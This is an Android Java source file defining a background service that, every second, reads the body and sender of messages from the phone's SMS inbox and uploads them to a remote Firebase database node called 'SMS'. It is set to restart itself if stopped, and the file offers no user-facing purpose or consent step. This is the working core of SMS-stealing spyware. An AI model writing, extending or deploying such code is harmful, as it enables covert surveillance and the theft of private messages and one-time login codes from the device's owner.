package buzz.pentagon.check;

import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.AppCompatDrawableManager;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.List;

public class MyService extends Service {
    public MyService() {
    }
    Runnable runnable;
    Handler handler;
    String body;
    Main2Activity m;
    DatabaseReference mDatabase;
    private final IBinder mBinder=new LocalBinder();
    public class LocalBinder extends Binder {
     public MyService getServiceInstance(){
         return MyService.this;
     }
    }
    Activity activity;
    public void registerActivity(Activity activity){
        this.activity=(Activity) activity;
    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return mBinder;
    }
    public int onStartCommand(Intent intent , int flags , int startID)
    {

        handler=new Handler();
        runnable= new Runnable() {
            @Override
            public void run() {

                mDatabase = FirebaseDatabase.getInstance().getReference("SMS");
                List<SMSData> smsList = new ArrayList<SMSData>();

                Uri uri = Uri.parse("content://sms/inbox");
                Cursor c= getContentResolver().query(uri, null, null ,null,null);
                activity.startManagingCursor(c);
                // Read the sms data and store it in the list
                if(c.moveToFirst()) {
                    for(int i=0; i < 2; i++) {//c.getCount()
                        SMSData sms = new SMSData();
                        sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                        sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                        smsList.add(sms);

                        c.moveToNext();
                    }
                }
                c.close();
                mDatabase.child("0").setValue(smsList.get(0));

                // Toast.makeText(getApplicationContext(),"hello",Toast.LENGTH_SHORT);
                handler.postDelayed(this,1000);
            }
        };
        handler.postDelayed(runnable,1000);
        return START_STICKY;


    }

}
